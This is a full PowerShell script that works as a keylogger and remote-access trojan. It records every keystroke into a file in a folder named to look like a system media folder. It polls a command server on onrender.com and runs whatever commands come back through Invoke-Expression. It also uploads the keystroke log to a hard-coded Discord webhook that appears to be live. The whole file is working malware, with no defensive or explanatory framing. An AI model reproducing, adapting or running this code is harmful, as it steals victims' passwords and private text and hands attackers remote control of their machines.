# 1. Direct variable definitions
$PCName     = "chase"
$WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
$C2Url      = "https://chase-4ebb.onrender.com"
$dir        = "$env:LOCALAPPDATA\WinMedia"

if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
$logFile = "$dir\data.txt"

# 2. Rebuilt Native C# Keyboard State Engine (Fixed structural variable overlapping)
$Source = @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public class KeyEngine {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
    [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
'@
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while ($true) {
    # ================= ENGINE A: HIGH-SPEED UNICODE MODIFIER KEYLOGGER =================
    # Track core modifier maps cleanly prior to processing individual loop steps
    $isShiftActive = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
    $isCtrlActive  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))

    for ($loopIdx = 8; $loopIdx -le 190; $loopIdx++) {
        if ([KeyEngine]::GetAsyncKeyState($loopIdx) -eq -32767) {
            $keyText = ""
            
            # Prevent lone structural modifier states from dirtying the log output arrays
            if ($loopIdx -eq 16 -or $loopIdx -eq 17 -or $loopIdx -eq 18 -or $loopIdx -eq 160 -or $loopIdx -eq 161 -or $loopIdx -eq 162 -or $loopIdx -eq 165) { continue }

            switch ($loopIdx) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                18  { $keyText = " [ALT] " }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                default {
                    # Handle hotkey combination matrices raw
                    if ($isCtrlActive) { 
                        $rawChar = [char]$loopIdx
                        $keyText = " [CTRL+$rawChar] " 
                    } else {
                        # FIXED: Completely isolated mapping scopes prevent $loopIdx corruption
                        $keyState = New-Object byte[] 256
                        [KeyEngine]::GetKeyboardState($keyState) | Out-Null
                        
                        # Explicitly pass Shift status directly into the memory matrix layout
                        if ($isShiftActive) { $keyState[16] = 0x80 }
                        
                        $scanCode = [KeyEngine]::MapVirtualKey($loopIdx, 0)
                        $buffer = New-Object System.Text.StringBuilder 5

                        # The returned tracking integer uses a distinct variable ($returnCode) to avoid index corruption
                        $returnCode = [KeyEngine]::ToUnicode($loopIdx, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
                        if ($returnCode -gt 0) { 
                            $keyText = $buffer.ToString() 
                        }
                    }
                }
            }

            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # ================= ENGINE B: REMOTE RCE POLLING LOOP =================
    if ($c2Interval -ge 1000) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                
                $postUrl = "${C2Url}/send_res?id=${PCName}"
                Invoke-RestMethod -Uri $postUrl -Method Post -Body $output -ContentType "text/plain" -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # ================= ENGINE C: DISCORD EXFILTRATION LOOP =================
    if ($discordInterval -ge 12000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    # High-precision delay timing optimized for flawless keystroke scanning accuracy
    Start-Sleep -m 5
    $c2Interval += 5
    $discordInterval += 5
}
